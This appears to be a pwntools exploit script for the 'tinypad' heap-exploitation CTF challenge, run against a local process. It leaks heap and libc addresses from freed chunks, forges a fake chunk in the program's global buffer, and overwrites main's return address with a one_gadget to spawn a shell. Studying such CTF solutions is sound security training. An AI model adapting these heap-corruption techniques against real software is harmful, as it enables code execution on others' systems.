#!/usr/bin/env python
# coding=utf-8
from pwn import *

elf = ELF('./tinypad')
libc = elf.libc
io = process('./tinypad')
context.log_level = 'debug'

def choice(idx):
    io.sendlineafter("(CMD)>>> ", idx)

def add(size, content):
    choice("A")
    io.sendlineafter("(SIZE)>>> ", str(size))
    io.sendlineafter("(CONTENT)>>> ", content)

def remove(idx):
    choice("D")
    io.sendlineafter("(INDEX)>>> ", str(idx))

def edit(idx, content):
    choice("E")
    io.sendlineafter("(INDEX)>>> ", str(idx))
    io.sendlineafter("(CONTENT)>>> ", content)
    io.sendlineafter("(Y/n)>>> ", "Y")

def quit():
    choice("Q")

def exp():

    #stage 1 leak the addr
    add(0x80, '1'*0x80)
    add(0x80, '2'*0x80)
    add(0x80, '3'*0x80)
    add(0x80, '4'*0x80)
    remove(3)
    remove(1)
    io.recvuntil("INDEX: 1\n")
    io.recvuntil(" # CONTENT: ")
    heap = u64(io.recvline().rstrip().ljust(8, '\x00')) - 0x120
    io.success("heap: 0x%x" % heap)
    io.recvuntil("INDEX: 3\n")
    io.recvuntil(" # CONTENT: ")
    leak_libc = u64(io.recvline().strip().ljust(8, '\x00')) - 88
    io.success("main_arena: 0x%x" %leak_libc)
    libc_base = leak_libc - 0x3c4b20
    remove(2)
    remove(4)
    
    #stage 2
    add(0x10, '1'*0x10)
    add(0x100, '2'*0xf8 + p64(0x11))
    add(0x100, '3'*0xf8)
    add(0x100, '4'*0xf8)
    tinypad = 0x0000000000602040
    offset = heap + 0x20 - (0x602040 + 0x20)
    io.success("offset: 0x%x" % offset)
    fake_chunk = p64(0) + p64(0x101) + p64(0x602060)*2
    edit(3, "4"*0x20 + fake_chunk)
    remove(1)
    
    add(0x18, '1'*0x10 + p64(offset))
    remove(2)
    edit(4, "4"*0x20 + p64(0) + p64(0x101) + p64(leak_libc + 88)*2)
    gdb.attach(io)
    pause()
    #stage 3
    one_gadget = libc_base + 0xf1247
    io.success("libc_base: 0x%x" % libc_base)
    environ_pointer = libc_base + libc.symbols['__environ']

    io.success("environ_pointer: 0x%x" % environ_pointer)
    add(0xf0, '1'*0xd0 + p64(0x18) + p64(environ_pointer) + 'a'*8 + p64(0x602148))
    gdb.attach(io)
    pause()
    io.recvuntil(" #   INDEX: 1\n")
    io.recvuntil(" # CONTENT: ")
    main_ret = u64(io.recvline().rstrip().ljust(8, '\x00')) - 0x8 * 30
    io.success("main_ret: %x" % main_ret)
    edit(2, p64(main_ret))
    edit(1, p64(one_gadget))
    quit()
    #gdb.attach(io)



if __name__ == '__main__':
    exp()
    io.interactive()
